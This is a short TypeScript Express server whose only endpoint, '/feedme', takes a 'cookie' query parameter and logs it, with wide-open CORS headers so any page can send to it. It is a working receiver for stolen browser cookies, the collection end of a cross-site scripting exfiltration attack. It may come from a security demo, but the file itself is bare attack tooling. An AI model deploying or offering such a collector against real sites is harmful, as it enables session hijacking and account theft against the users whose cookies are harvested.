import * as express from 'express';
import { urlencoded, json } from 'body-parser';

const port = 3000;
const app = express()
	.use(urlencoded({ extended : true }))
	.use(json())
	.use(
		function(req, res, next) {
			res.header("Access-Control-Allow-Origin", "*");
			res.header("Access-Control-Allow-Headers", "*");
			next();
		  }
	);

app.get('/feedme', (req, res) => {
	const { cookie } = req.query;
	console.log(`oh nom nom: ${cookie}`);

	res.sendStatus(200);
});

app.listen(port, () => console.log('\x1b[36m%s\x1b[0m', `Listening at https://localhost:${port}`));
